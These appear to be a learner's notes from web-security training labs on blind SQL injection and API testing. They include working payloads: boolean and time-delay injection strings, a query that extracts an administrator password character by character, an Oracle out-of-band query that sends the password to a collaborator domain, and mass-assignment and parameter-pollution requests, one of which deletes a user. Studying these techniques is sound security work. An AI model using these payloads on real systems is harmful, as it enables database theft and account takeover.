💉 SQL Injection (SQLi) - Advanced Techniques

The focus shifted from visible UNION-based attacks to "Blind" scenarios where the application does not return database results in the response.

1. Blind SQLi with Conditional Responses
The goal is to ask the database true/false questions based on the response content.

    Step 1: Verify vulnerability with a boolean condition:
    TrackingId=xyz' AND '1'='1-- (Normal response)
    TrackingId=xyz' AND '1'='2-- (Different response/Error)

    Step 2: Brute-force data character by character using Burp Intruder:
    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

2. Blind SQLi with Time Delays
Used when the application handles errors gracefully and doesn't change content.

    PostgreSQL: ' || pg_sleep(10)--

    Oracle: ' || dbms_pipe.receive_message(('a'),10)--

3. Out-of-band (OAST) Techniques
The most powerful method for blind exfiltration, using Burp Collaborator to trigger a DNS or HTTP request from the database.

    Key Takeaway: Useful when all other blind techniques are filtered or blocked.

    Example (DNS Exfiltration):
    SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual

🌐 API Testing

Completed the full API Testing learning path, focusing on discovering and manipulating hidden endpoints.

1. API Recon & Documentation Discovery
Finding the "map" of the API is the first step.

    Technique: Fuzzing common paths like /api, /v1, /swagger.json, or /openapi.json.

    Key Takeaway: Developers often leave documentation endpoints public, which reveals all available routes and parameters.

2. Mass Assignment Vulnerabilities
Exploiting APIs that automatically bind input parameters to internal database objects.

    Attack: Adding hidden parameters to a JSON request.

    Example: Changing {"name": "user"} to {"name": "user", "role": "admin"} or {"is_admin": true} during profile updates.

3. Server-Side Parameter Pollution (SSPP)
Injecting parameters into internal API requests made by the server.

    Query String Pollution: Using URL-encoded characters (#, &) to truncate or add parameters to the internal backend query.
    GET /search?public_api_key=123&user=admin%23 (Using # to comment out the rest of the internal query).

    REST Path Pollution: Navigating the internal API structure using directory traversal.
    GET /api/user/123/../../admin/deleteUser?username=victim
